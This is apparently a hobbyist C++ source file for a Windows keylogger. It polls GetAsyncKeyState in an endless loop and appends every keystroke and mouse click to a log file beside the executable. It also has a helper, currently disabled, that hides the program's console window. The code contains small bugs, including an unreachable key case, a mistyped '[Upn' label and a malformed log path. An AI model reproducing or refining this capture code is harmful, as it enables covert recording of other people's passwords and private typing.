#include<windows.h>
#include<iostream>
#include<string>
#include<fstream>

using namespace std;

//#define MAX_PATH  32767

//string dir = "C:\\Users\\Zach\\Desktop\\";
string dir;
string logfile;
string logname = "file.txt";
string progname;

void hide();
void show();
void TrackKey();
string GetFullExecPath();

int main()
{
    cout << GetFullExecPath()<< endl;
    dir = GetFullExecPath();

    logfile = dir;
    logfile += logname;

    cout << "Some text jargon stuf here\n";
//    hide();
        TrackKey();

}


void hide()
{
    cout<< "here\n";
    progname = dir;
    progname += "qtcreator_process_stub.exe";

    HWND hwnd;
    hwnd = FindWindow(0, (LPCTSTR)progname.c_str());
    if(hwnd != 0)
    {
        ShowWindow (hwnd, SW_HIDE);
    }

}

void show()
{
    HWND hwnd;
    hwnd = FindWindow(0, TEXT("Windows Task Manager"));
    if(hwnd != 0)
    {
        ShowWindow (hwnd, SW_SHOW);
    }

}


void TrackKey()
{
/*
    ofstream fout;
    fout.open("C:\\Users\\Zach\\Desktop\\file.txt", ios::app);

    if(fout.fail())
    {   return;
        cout << "FAIL\n";
    }
*/

    FILE *OUTPUT_FILE;
//    OUTPUT_FILE = fopen("C:\\Users\\Zach\\Desktop\\file.txt","a+");
    OUTPUT_FILE = fopen(logfile.c_str(),"a+");

    while(1)
    {
        for(int key = 0; key < 127; key++)
        {
            if(GetAsyncKeyState(key) == -32767)
            {
                cout << key << endl;
//                fout << key;
//                fprintf(OUTPUT_FILE, "%s", &key);
                switch (key)
                {
                    case 1:
                       fprintf(OUTPUT_FILE, "%s", "[Left Click]"); break;
                    case 2:
                        fprintf(OUTPUT_FILE, "%s", "[Right Click]"); break;
                    case 8:
                        fprintf(OUTPUT_FILE, "%s", "[Backspace]"); break;
                    case 9:
                        fprintf(OUTPUT_FILE, "%s", "[Tab]"); break;
                    case 13:
                        fprintf(OUTPUT_FILE, "%s", "\n"); break;
                    case 27:
                        fprintf(OUTPUT_FILE, "%s", "[Escape]"); break;
                case 46:
                    fprintf(OUTPUT_FILE, "%s", "[Delete]"); break;
                case VK_SHIFT:
                    fprintf(OUTPUT_FILE, "%s", "[Shift]"); break;
                case VK_CONTROL:
                    fprintf(OUTPUT_FILE, "%s", "[Control]"); break;
                case VK_END:
                    fprintf(OUTPUT_FILE, "%s", "[End]"); break;
                case VK_HOME:
                    fprintf(OUTPUT_FILE, "%s", "[Home]"); break;
                case VK_INSERT:
                    fprintf(OUTPUT_FILE, "%s", "[INSERT]"); break;
                case VK_SPACE:
                    fprintf(OUTPUT_FILE, "%s", "[Space]"); break;
                case VK_LEFT:
                    fprintf(OUTPUT_FILE, "%s", "[Left]"); break;
                case VK_RIGHT:
                    fprintf(OUTPUT_FILE, "%s", "[Right]"); break;
                case VK_UP:
                    fprintf(OUTPUT_FILE, "%s", "[Upn"); break;
                case VK_DOWN:
                    fprintf(OUTPUT_FILE, "%s", "[Down]"); break;
                case 110:
                    fprintf(OUTPUT_FILE, "%s", "."); break;
                case 190:
                    fprintf(OUTPUT_FILE, "%s", "."); break;
                    default:
                        fprintf(OUTPUT_FILE, "%s", &key); break;
                }

            }
            else
            {

            }
        }

    }

    fclose(OUTPUT_FILE);
}


string GetFullExecPath()
{
    char path[MAX_PATH];
    GetModuleFileNameA( NULL, path, MAX_PATH );
    string::size_type pos = string( path).find_last_of( "\\/" );
    return string( path ).substr( 0, pos);
}
